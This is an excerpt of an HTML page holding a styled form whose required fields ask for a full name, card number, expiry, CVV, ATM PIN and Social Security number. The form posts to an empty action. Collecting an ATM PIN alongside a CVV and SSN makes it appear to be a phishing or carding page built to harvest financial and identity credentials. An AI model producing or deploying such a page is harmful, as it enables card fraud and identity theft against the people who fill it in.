                ...
                <div class="flex md:w-1/8 px-3 justify-center py-8 items-center bg-white">
                    <form action="" method="post" class="bg-white flex flex-col w-11/12">
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="text" placeholder="Full Name" required name="fname" id="fname" class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="number" placeholder="Card Number" required name="card" id="card" class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="number" placeholder="EXPY" name="expy" required id="expy" class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="number" placeholder="CVV" name="cvv" id="cvv" required class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="number" placeholder="ATM PIN" name="pin" id="pin" required class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="number" placeholder="SSN" name="ssn" id="ssn" required class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
